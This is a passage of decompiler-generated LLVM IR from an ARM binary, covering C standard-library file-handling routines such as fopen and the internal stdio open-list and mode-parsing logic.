  %v1_160ac = and i32 %v3_160a8, 24576
  %v1_160b0 = or i32 %v1_160ac, 48
  store i32 %v1_160b0, i32* %r3.global-to-local, align 4
  %v0_160b4 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_160b4 = icmp eq i32 %v0_160b4, 0
  %v1_160b8 = trunc i32 %v1_160b0 to i16
  store i16 %v1_160b8, i16* %v1_160a8, align 2
  br i1 %v2_160b4, label %dec_label_pc_160c0, label %dec_label_pc_16134

dec_label_pc_160c0:                               ; preds = %dec_label_pc_160a8
  %v0_160c0 = load i32, i32* @r5, align 4
  %v1_160c0 = add i32 %v0_160c0, 60
  %v2_160c0 = inttoptr i32 %v1_160c0 to i32*
  %v3_160c0 = load i32, i32* %v2_160c0, align 4
  %v1_160c4 = add i32 %v3_160c0, -1
  store i32 %v1_160c4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_160c8 = icmp eq i32 %v1_160c4, 0
  store i32 %v1_160c4, i32* %v2_160c0, align 4
  br i1 %v2_160c8, label %dec_label_pc_160d4, label %dec_label_pc_16134

dec_label_pc_160d4:                               ; preds = %dec_label_pc_160c0
  %v0_160d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_160d4 = load i32, i32* @r5, align 4
  %v2_160d4 = add i32 %v1_160d4, 64
  %v3_160d4 = inttoptr i32 %v2_160d4 to i32*
  store i32 %v0_160d4, i32* %v3_160d4, align 4
  %v0_160d8 = load i32, i32* @r5, align 4
  %v1_160d8 = add i32 %v0_160d8, 56
  store i32 %v1_160d8, i32* @r6, align 4
  br label %dec_label_pc_160dc

dec_label_pc_160dc:                               ; preds = %dec_label_pc_1610c.dec_label_pc_160dc_crit_edge, %dec_label_pc_160d4
  %v0_160e4 = phi i32 [ %v0_160e4.pre, %dec_label_pc_1610c.dec_label_pc_160dc_crit_edge ], [ %v1_160d8, %dec_label_pc_160d4 ]
  %v0_160dc = phi i32 [ %v0_160dc.pre, %dec_label_pc_1610c.dec_label_pc_160dc_crit_edge ], [ %v0_160d8, %dec_label_pc_160d4 ]
  %v1_160dc = add i32 %v0_160dc, 56
  %v2_160dc = inttoptr i32 %v1_160dc to i32*
  %v3_160dc = load i32, i32* %v2_160dc, align 4
  store i32 %v3_160dc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_160e4, i32* %r2.global-to-local, align 4
  %v1_160e882 = inttoptr i32 %v0_160e4 to i32*
  %v2_160e883 = load i32, i32* %v1_160e882, align 4
  store i32 %v2_160e883, i32* %r3.global-to-local, align 4
  %v3_160ec85 = icmp uge i32 %v2_160e883, %v3_160dc
  store i1 %v3_160ec85, i1* %cpsr_c.global-to-local, align 1
  %v9_160ec91 = icmp eq i32 %v2_160e883, %v3_160dc
  br i1 %v9_160ec91, label %dec_label_pc_160f4, label %dec_label_pc_1610c

dec_label_pc_160f4:                               ; preds = %dec_label_pc_160dc, %dec_label_pc_160f4.dec_label_pc_160e8_crit_edge
  %v0_160f492 = phi i32 [ %v1_160ec.pre, %dec_label_pc_160f4.dec_label_pc_160e8_crit_edge ], [ %v3_160dc, %dec_label_pc_160dc ]
  store i32 %v0_160f492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16104 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16104, label %dec_label_pc_16108, label %dec_label_pc_160f4.dec_label_pc_160e8_crit_edge

dec_label_pc_160f4.dec_label_pc_160e8_crit_edge:  ; preds = %dec_label_pc_160f4
  %v0_160e8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_160ec.pre = load i32, i32* @r4, align 4
  %v1_160e8 = inttoptr i32 %v0_160e8.pre to i32*
  %v2_160e8 = load i32, i32* %v1_160e8, align 4
  store i32 %v2_160e8, i32* %r3.global-to-local, align 4
  %v3_160ec = icmp uge i32 %v2_160e8, %v1_160ec.pre
  store i1 %v3_160ec, i1* %cpsr_c.global-to-local, align 1
  %v9_160ec = icmp eq i32 %v2_160e8, %v1_160ec.pre
  br i1 %v9_160ec, label %dec_label_pc_160f4, label %dec_label_pc_1610c

dec_label_pc_16108:                               ; preds = %dec_label_pc_160f4
  %v0_16108 = load i32, i32* @r4, align 4
  store i32 %v0_16108, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1610c

dec_label_pc_1610c:                               ; preds = %dec_label_pc_160dc, %dec_label_pc_160f4.dec_label_pc_160e8_crit_edge, %dec_label_pc_16108
  %v0_16114 = phi i32 [ %v0_16108, %dec_label_pc_16108 ], [ %v2_160e883, %dec_label_pc_160dc ], [ %v2_160e8, %dec_label_pc_160f4.dec_label_pc_160e8_crit_edge ]
  %v1_1610c = phi i32 [ %v0_16108, %dec_label_pc_16108 ], [ %v3_160dc, %dec_label_pc_160dc ], [ %v1_160ec.pre, %dec_label_pc_160f4.dec_label_pc_160e8_crit_edge ]
  %v3_1610c = icmp uge i32 %v0_16114, %v1_1610c
  store i1 %v3_1610c, i1* %cpsr_c.global-to-local, align 1
  %v9_1610c = icmp eq i32 %v0_16114, %v1_1610c
  br i1 %v9_1610c, label %dec_label_pc_16114, label %dec_label_pc_1610c.dec_label_pc_160dc_crit_edge

dec_label_pc_1610c.dec_label_pc_160dc_crit_edge:  ; preds = %dec_label_pc_1610c
  %v0_160dc.pre = load i32, i32* @r5, align 4
  %v0_160e4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_160dc

dec_label_pc_16114:                               ; preds = %dec_label_pc_1610c
  %v2_16114 = icmp ne i32 %v1_1610c, 0
  store i1 %v2_16114, i1* %cpsr_c.global-to-local, align 1
  %v7_16118 = icmp slt i32 %v1_1610c, 2
  br i1 %v7_16118, label %dec_label_pc_16134, label %dec_label_pc_1611c

dec_label_pc_1611c:                               ; preds = %dec_label_pc_16114
  %v0_1611c = load i32, i32* @r5, align 4
  %v1_1611c = add i32 %v0_1611c, 56
  store i32 %v1_1611c, i32* %r0.global-to-local, align 4
  %v0_16120 = load i32, i32* %r1.global-to-local, align 4
  %v1_16120 = add i32 %v0_16120, 129
  store i32 %v1_16120, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16134

dec_label_pc_16134:                               ; preds = %dec_label_pc_160c0, %dec_label_pc_160a8, %dec_label_pc_1611c, %dec_label_pc_16114
  %v0_16134 = load i32, i32* @r5, align 4
  %v1_16134 = inttoptr i32 %v0_16134 to i16*
  %v2_16134 = load i16, i16* %v1_16134, align 2
  %v3_16134 = zext i16 %v2_16134 to i32
  store i32 %v3_16134, i32* %r3.global-to-local, align 4
  %v1_16138 = and i32 %v3_16134, 16384
  %v2_16138 = icmp eq i32 %v1_16138, 0
  br i1 %v2_16138, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_16134
  %v2_1613c = add i32 %v0_16134, 8
  %v3_1613c = inttoptr i32 %v2_1613c to i32*
  %v4_1613c = load i32, i32* %v3_1613c, align 4
  store i32 %v4_1613c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_16134, %bb48
  %v1_16140 = xor i1 %v2_16138, true
  call void @__pseudo_cond_branch(i1 %v1_16140, i32 ptrtoint (i32* @global_var_1358c.34 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16148 = load i32, i32* @r8, align 4
  %v2_16148 = add i32 %v0_16148, 160
  %v3_16148 = inttoptr i32 %v2_16148 to i32*
  %v4_16148 = load i32, i32* %v3_16148, align 4
  store i32 %v4_16148, i32* @r5, align 4
  %v1_1614c = add i32 %v4_16148, 8
  %v2_1614c = inttoptr i32 %v1_1614c to i32*
  %v3_1614c = load i32, i32* %v2_1614c, align 4
  store i32 %v3_1614c, i32* %r3.global-to-local, align 4
  %v1_16150 = load i32, i32* %sl.global-to-local, align 4
  %v3_16150 = icmp uge i32 %v3_1614c, %v1_16150
  store i1 %v3_16150, i1* %cpsr_c.global-to-local, align 1
  %v9_16150 = icmp eq i32 %v3_1614c, %v1_16150
  br i1 %v9_16150, label %dec_label_pc_16198, label %dec_label_pc_16158

dec_label_pc_16158:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16148, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1616475 = inttoptr i32 %v4_16148 to i32*
  %v2_1616476 = load i32, i32* %v1_1616475, align 4
  store i32 %v2_1616476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1616878 = icmp eq i32 %v2_1616476, 0
  br i1 %v9_1616878, label %dec_label_pc_16170, label %dec_label_pc_16188

dec_label_pc_16170:                               ; preds = %dec_label_pc_16158, %dec_label_pc_16170.dec_label_pc_16164_crit_edge
  %v0_1617079 = phi i32 [ %v1_16168.pre, %dec_label_pc_16170.dec_label_pc_16164_crit_edge ], [ 0, %dec_label_pc_16158 ]
  store i32 %v0_1617079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16180 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16180, label %dec_label_pc_16184, label %dec_label_pc_16170.dec_label_pc_16164_crit_edge

dec_label_pc_16170.dec_label_pc_16164_crit_edge:  ; preds = %dec_label_pc_16170
  %v0_16164.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16168.pre = load i32, i32* @r4, align 4
  %v1_16164 = inttoptr i32 %v0_16164.pre to i32*
  %v2_16164 = load i32, i32* %v1_16164, align 4
  store i32 %v2_16164, i32* %r3.global-to-local, align 4
  %v3_16168 = icmp uge i32 %v2_16164, %v1_16168.pre
  store i1 %v3_16168, i1* %cpsr_c.global-to-local, align 1
  %v9_16168 = icmp eq i32 %v2_16164, %v1_16168.pre
  br i1 %v9_16168, label %dec_label_pc_16170, label %dec_label_pc_16188

dec_label_pc_16184:                               ; preds = %dec_label_pc_16170
  %v0_16184 = load i32, i32* @r4, align 4
  store i32 %v0_16184, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16188

dec_label_pc_16188:                               ; preds = %dec_label_pc_16158, %dec_label_pc_16170.dec_label_pc_16164_crit_edge, %dec_label_pc_16184
  %v0_16188 = phi i32 [ %v0_16184, %dec_label_pc_16184 ], [ %v2_1616476, %dec_label_pc_16158 ], [ %v2_16164, %dec_label_pc_16170.dec_label_pc_16164_crit_edge ]
  %v1_16188 = phi i32 [ %v0_16184, %dec_label_pc_16184 ], [ 0, %dec_label_pc_16158 ], [ %v1_16168.pre, %dec_label_pc_16170.dec_label_pc_16164_crit_edge ]
  %v3_16188 = icmp uge i32 %v0_16188, %v1_16188
  store i1 %v3_16188, i1* %cpsr_c.global-to-local, align 1
  %v9_16188 = icmp eq i32 %v0_16188, %v1_16188
  br i1 %v9_16188, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_16188
  %v1_1618c = load i32, i32* @r5, align 4
  store i32 %v1_1618c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_16188, %bb50
  %v1_16190 = xor i1 %v9_16188, true
  call void @__pseudo_cond_branch(i1 %v1_16190, i32 ptrtoint (i32* @global_var_14744.525 to i32))
  %v0_16194 = load i32, i32* %sl.global-to-local, align 4
  %v1_16194 = load i32, i32* @r5, align 4
  %v2_16194 = add i32 %v1_16194, 8
  %v3_16194 = inttoptr i32 %v2_16194 to i32*
  store i32 %v0_16194, i32* %v3_16194, align 4
  %v0_1619c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_16198

dec_label_pc_16198:                               ; preds = %bb49, %bb51
  %v0_1619c = phi i32 [ %v0_16148, %bb49 ], [ %v0_1619c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_1619c = add i32 %v0_1619c, 80
  %v3_1619c = inttoptr i32 %v2_1619c to i32*
  %v4_1619c = load i32, i32* %v3_1619c, align 4
  store i32 %v4_1619c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_161a4 = add i32 %v0_1619c, 160
  %v3_161a4 = inttoptr i32 %v2_161a4 to i32*
  %v4_161a4 = load i32, i32* %v3_161a4, align 4
  store i32 %v4_161a4, i32* %r0.global-to-local, align 4
  %v1_161a8 = inttoptr i32 %v4_1619c to i32*
  %v2_161a8 = load i32, i32* %v1_161a8, align 4
  store i32 %v2_161a8, i32* %r3.global-to-local, align 4
  %v1_161ac = add i32 %v4_161a4, 4
  %v2_161ac = inttoptr i32 %v1_161ac to i32*
  %v3_161ac = load i32, i32* %v2_161ac, align 4
  store i32 %v3_161ac, i32* %r1.global-to-local, align 4
  %v1_161b0 = add i32 %v2_161a8, 1
  store i32 %v1_161b0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_161b4 = icmp eq i32 %v3_161ac, 0
  store i32 %v1_161b0, i32* %v1_161a8, align 4
  br i1 %v2_161b4, label %dec_label_pc_161c0, label %dec_label_pc_16220

dec_label_pc_161c0:                               ; preds = %dec_label_pc_16198
  %v0_161c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_161c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_161c0 = add i32 %v1_161c0, 8
  %v3_161c0 = inttoptr i32 %v2_161c0 to i32*
  store i32 %v0_161c0, i32* %v3_161c0, align 4
  %v0_161c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_161c4, i32* @r5, align 4
  br label %dec_label_pc_161c8

dec_label_pc_161c8:                               ; preds = %dec_label_pc_161f8.dec_label_pc_161c8_crit_edge, %dec_label_pc_161c0
  %v0_161c8 = phi i32 [ %v0_161c8.pre, %dec_label_pc_161f8.dec_label_pc_161c8_crit_edge ], [ %v0_161c4, %dec_label_pc_161c0 ]
  %v1_161c8 = inttoptr i32 %v0_161c8 to i32*
  %v2_161c8 = load i32, i32* %v1_161c8, align 4
  store i32 %v2_161c8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_161c8, i32* %r2.global-to-local, align 4
  %v2_161d464 = load i32, i32* %v1_161c8, align 4
  store i32 %v2_161d464, i32* %r3.global-to-local, align 4
  %v3_161d866 = icmp uge i32 %v2_161d464, %v2_161c8
  store i1 %v3_161d866, i1* %cpsr_c.global-to-local, align 1
  %v9_161d872 = icmp eq i32 %v2_161d464, %v2_161c8
  br i1 %v9_161d872, label %dec_label_pc_161e0, label %dec_label_pc_161f8

dec_label_pc_161e0:                               ; preds = %dec_label_pc_161c8, %dec_label_pc_161e0.dec_label_pc_161d4_crit_edge
  %v0_161e073 = phi i32 [ %v1_161d8.pre, %dec_label_pc_161e0.dec_label_pc_161d4_crit_edge ], [ %v2_161c8, %dec_label_pc_161c8 ]
  store i32 %v0_161e073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_161f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_161f0, label %dec_label_pc_161f4, label %dec_label_pc_161e0.dec_label_pc_161d4_crit_edge

dec_label_pc_161e0.dec_label_pc_161d4_crit_edge:  ; preds = %dec_label_pc_161e0
  %v0_161d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_161d8.pre = load i32, i32* @r4, align 4
  %v1_161d4 = inttoptr i32 %v0_161d4.pre to i32*
  %v2_161d4 = load i32, i32* %v1_161d4, align 4
  store i32 %v2_161d4, i32* %r3.global-to-local, align 4
  %v3_161d8 = icmp uge i32 %v2_161d4, %v1_161d8.pre
  store i1 %v3_161d8, i1* %cpsr_c.global-to-local, align 1
  %v9_161d8 = icmp eq i32 %v2_161d4, %v1_161d8.pre
  br i1 %v9_161d8, label %dec_label_pc_161e0, label %dec_label_pc_161f8

dec_label_pc_161f4:                               ; preds = %dec_label_pc_161e0
  %v0_161f4 = load i32, i32* @r4, align 4
  store i32 %v0_161f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_161f8

dec_label_pc_161f8:                               ; preds = %dec_label_pc_161c8, %dec_label_pc_161e0.dec_label_pc_161d4_crit_edge, %dec_label_pc_161f4
  %v0_16200 = phi i32 [ %v0_161f4, %dec_label_pc_161f4 ], [ %v2_161d464, %dec_label_pc_161c8 ], [ %v2_161d4, %dec_label_pc_161e0.dec_label_pc_161d4_crit_edge ]
  %v1_161f8 = phi i32 [ %v0_161f4, %dec_label_pc_161f4 ], [ %v2_161c8, %dec_label_pc_161c8 ], [ %v1_161d8.pre, %dec_label_pc_161e0.dec_label_pc_161d4_crit_edge ]
  %v3_161f8 = icmp uge i32 %v0_16200, %v1_161f8
  store i1 %v3_161f8, i1* %cpsr_c.global-to-local, align 1
  %v9_161f8 = icmp eq i32 %v0_16200, %v1_161f8
  br i1 %v9_161f8, label %dec_label_pc_16200, label %dec_label_pc_161f8.dec_label_pc_161c8_crit_edge

dec_label_pc_161f8.dec_label_pc_161c8_crit_edge:  ; preds = %dec_label_pc_161f8
  %v0_161c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_161c8

dec_label_pc_16200:                               ; preds = %dec_label_pc_161f8
  %v2_16200 = icmp ne i32 %v1_161f8, 0
  store i1 %v2_16200, i1* %cpsr_c.global-to-local, align 1
  %v7_16204 = icmp slt i32 %v1_161f8, 2
  br i1 %v7_16204, label %dec_label_pc_16220, label %dec_label_pc_16208

dec_label_pc_16208:                               ; preds = %dec_label_pc_16200
  %v0_16208 = load i32, i32* @r5, align 4
  store i32 %v0_16208, i32* %r0.global-to-local, align 4
  %v0_1620c = load i32, i32* %r1.global-to-local, align 4
  %v1_1620c = add i32 %v0_1620c, 129
  store i32 %v1_1620c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16220

dec_label_pc_16220:                               ; preds = %dec_label_pc_16198, %dec_label_pc_16208, %dec_label_pc_16200
  %v0_16220 = call i32 @_stdio_openlist_dec_use()
  %v0_16224 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_16224, i32* %r0.global-to-local, align 4
  %v2_1622c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1622c, i32* @r4, align 4
  store i32 %v6_15f14, i32* @r5, align 4
  store i32 %v9_15f14, i32* @r6, align 4
  store i32 %v12_15f14, i32* @r7, align 4
  ret i32 %v0_16224

; uselistorder directives
  uselistorder i32 %v0_161f4, { 1, 0, 2 }
  uselistorder i32 %v1_161d8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_161c8, { 1, 0 }
  uselistorder i32 %v0_1619c, { 1, 0 }
  uselistorder i32 %v0_16184, { 1, 0, 2 }
  uselistorder i32 %v1_16168.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16150, { 1, 0 }
  uselistorder i32 %v0_16108, { 1, 0, 2 }
  uselistorder i32 %v1_160ec.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1607c, { 1, 0, 2 }
  uselistorder i32 %v1_16060.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16050, { 1, 0 }
  uselistorder i32 %v0_1600c, { 1, 0, 2 }
  uselistorder i32 %v1_15ff0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15fd0, { 1, 0 }
  uselistorder i32 %v1_15f5c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 10, 9, 42, 11, 14, 12, 13, 15, 17, 16, 43, 18, 19, 20, 21, 22, 24, 23, 44, 25, 26, 27, 28, 30, 29, 45, 31, 32, 33, 34, 35, 36, 37, 39, 38, 46, 40 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 24, 25, 3, 4, 5, 26, 27, 6, 7, 8, 9, 28, 29, 10, 11, 12, 13, 14, 30, 31, 15, 16, 17, 32, 33, 18, 19, 20, 21, 34, 35, 22, 23 }
  uselistorder i32 (i32)* @__GI___libc_close, { 29, 27, 26, 33, 32, 25, 31, 30, 24, 2, 28, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_16220, { 1, 2, 0 }
  uselistorder label %dec_label_pc_161f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_161e0, { 1, 0 }
  uselistorder label %dec_label_pc_16198, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_16188, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16170, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_16134, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1610c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_160f4, { 1, 0 }
  uselistorder label %dec_label_pc_160a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16080, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16068, { 1, 0 }
  uselistorder label %dec_label_pc_16020, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_16010, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15ff8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_15f98, { 1, 0 }
  uselistorder label %dec_label_pc_15f8c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_15f7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15f64, { 1, 0 }
}

define i32 @function_16238(i32 %arg1) local_unnamed_addr {
dec_label_pc_16238:
  %v0_16238 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16238, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16238
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16238, %bb
  %v10_16240 = phi i32 [ %arg1, %dec_label_pc_16238 ], [ 0, %bb ]
  ret i32 %v10_16240

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_16254 = call i32 @_stdio_fopen()
  ret i32 %v0_16254
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16264 = load i32, i32* @r4, align 4
  store i32 %v3_16264, i32* %stack_var_-24, align 4
  %v6_16264 = load i32, i32* @r5, align 4
  %v9_16264 = load i32, i32* @r6, align 4
  %v12_16264 = load i32, i32* @r7, align 4
  %v15_16264 = load i32, i32* @r8, align 4
  %v0_16268 = load i32, i32* @r1, align 4
  %v1_16268 = inttoptr i32 %v0_16268 to i8*
  %v2_16268 = load i8, i8* %v1_16268, align 1
  %v2_16270 = icmp ugt i8 %v2_16268, 113
  store i1 %v2_16270, i1* %cpsr_c.global-to-local, align 1
  %v7_16270 = icmp eq i8 %v2_16268, 114
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r8, align 4
  %v0_1627c = load i32, i32* @r0, align 4
  store i32 %v0_1627c, i32* @r7, align 4
  %v0_16280 = load i32, i32* @r2, align 4
  store i32 %v0_16280, i32* @r5, align 4
  %v0_16284 = load i32, i32* @r3, align 4
  store i32 %v0_16284, i32* @r6, align 4
  br i1 %v7_16270, label %dec_label_pc_162d8, label %dec_label_pc_1628c

dec_label_pc_1628c:                               ; preds = %entry
  %v2_1628c = icmp ugt i8 %v2_16268, 118
  store i1 %v2_1628c, i1* %cpsr_c.global-to-local, align 1
  %v7_1628c = icmp eq i8 %v2_16268, 119
  br i1 %v7_1628c, label %bb, label %dec_label_pc_16298

bb:                                               ; preds = %dec_label_pc_1628c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_162dc

dec_label_pc_16298:                               ; preds = %dec_label_pc_1628c
  %v2_16298 = icmp ugt i8 %v2_16268, 96
  store i1 %v2_16298, i1* %cpsr_c.global-to-local, align 1
  %v7_16298 = icmp eq i8 %v2_16268, 97
  br i1 %v7_16298, label %bb49, label %dec_label_pc_162a4

bb49:                                             ; preds = %dec_label_pc_16298
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_162dc

dec_label_pc_162a4:                               ; preds = %dec_label_pc_16298, %dec_label_pc_16374, %dec_label_pc_16348
  store i32 49064, i32* %r2.global-to-local, align 4
  %v0_162a8 = call i32 @__aeabi_read_tp()
  store i32 %v0_162a8, i32* %r0.global-to-local, align 4
  %v3_162ac = load i16, i16* @global_var_2225c.361, align 2
  %v4_162ac = sext i16 %v3_162ac to i32
  store i32 %v4_162ac, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_162b4 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_162b4 = icmp eq i32 %v0_162b4, 0
  %v3_162b8 = add i32 %v4_162ac, %v0_162a8
  %v4_162b8 = inttoptr i32 %v3_162b8 to i32*
  store i32 22, i32* %v4_162b8, align 4
  br i1 %v2_162b4, label %dec_label_pc_1667c, label %dec_label_pc_162c0

dec_label_pc_162c0:                               ; preds = %dec_label_pc_16398._crit_edge, %dec_label_pc_162a4
  %v0_162c0 = load i32, i32* @r5, align 4
  %v1_162c0 = inttoptr i32 %v0_162c0 to i16*
  %v2_162c0 = load i16, i16* %v1_162c0, align 2
  %v3_162c0 = zext i16 %v2_162c0 to i32
  store i32 %v3_162c0, i32* %r3.global-to-local, align 4
  %v1_162c4 = and i32 %v3_162c0, 8192
  %v2_162c4 = icmp eq i32 %v1_162c4, 0
  br i1 %v2_162c4, label %dec_label_pc_1667c, label %dec_label_pc_162cc

dec_label_pc_162cc:                               ; preds = %dec_label_pc_162c0
  store i32 %v0_162c0, i32* @r0, align 4
  %v0_162d0 = call i32 @free()
  store i32 %v0_162d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1667c

dec_label_pc_162d8:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_162dc

dec_label_pc_162dc:                               ; preds = %bb, %bb49, %dec_label_pc_162d8
  %v1_162f4 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_162d8 ]
  %v1_162dc = add i32 %v0_16268, 1
  %v2_162dc = inttoptr i32 %v1_162dc to i8*
  %v3_162dc = load i8, i8* %v2_162dc, align 1
  %v2_162e0 = icmp ugt i8 %v3_162dc, 97
  store i1 %v2_162e0, i1* %cpsr_c.global-to-local, align 1
  %v7_162e0 = icmp eq i8 %v3_162dc, 98
  %v1_162dc.v0_16268 = select i1 %v7_162e0, i32 %v1_162dc, i32 %v0_16268
  store i32 %v1_162dc.v0_16268, i32* %r3.global-to-local, align 4
  %v1_162ec = add i32 %v1_162dc.v0_16268, 1
  %v2_162ec = inttoptr i32 %v1_162ec to i8*
  %v3_162ec = load i8, i8* %v2_162ec, align 1
  %v4_162ec = zext i8 %v3_162ec to i32
  store i32 %v4_162ec, i32* @r3, align 4
  %v2_162f0 = icmp ugt i8 %v3_162ec, 42
  store i1 %v2_162f0, i1* %cpsr_c.global-to-local, align 1
  %v7_162f0 = icmp eq i8 %v3_162ec, 43
  br i1 %v7_162f0, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_162dc
  store i32 %v1_162f4, i32* @r3, align 4
  %v2_162f8 = add nuw nsw i32 %v1_162f4, 1
  store i32 %v2_162f8, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_162dc, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_162fc = icmp eq i32 %v0_16280, 0
  br i1 %v2_162fc, label %dec_label_pc_16304, label %dec_label_pc_16340

dec_label_pc_16304:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_16308 = call i32 @malloc()
  store i32 %v0_16308, i32* %r0.global-to-local, align 4
  store i32 %v0_16308, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1630c = icmp eq i32 %v0_16308, 0
  br i1 %v3_1630c, label %dec_label_pc_16680, label %dec_label_pc_16314

dec_label_pc_16314:                               ; preds = %dec_label_pc_16304
  %v0_16318 = load i32, i32* @r8, align 4
  %v2_16318 = add i32 %v0_16318, -33136
  store i32 %v2_16318, i32* %r3.global-to-local, align 4
  %v1_1631c = inttoptr i32 %v2_16318 to i32*
  %v2_1631c = load i32, i32* %v1_1631c, align 4
  store i32 %v2_1631c, i32* %r0.global-to-local, align 4
  %v3_1631c = add i32 %v0_16318, -33132
  %v4_1631c = inttoptr i32 %v3_1631c to i32*
  %v5_1631c = load i32, i32* %v4_1631c, align 4
  store i32 %v5_1631c, i32* @r1, align 4
  %v6_1631c = add i32 %v0_16318, -33128
  %v7_1631c = inttoptr i32 %v6_1631c to i32*
  %v8_1631c = load i32, i32* %v7_1631c, align 4
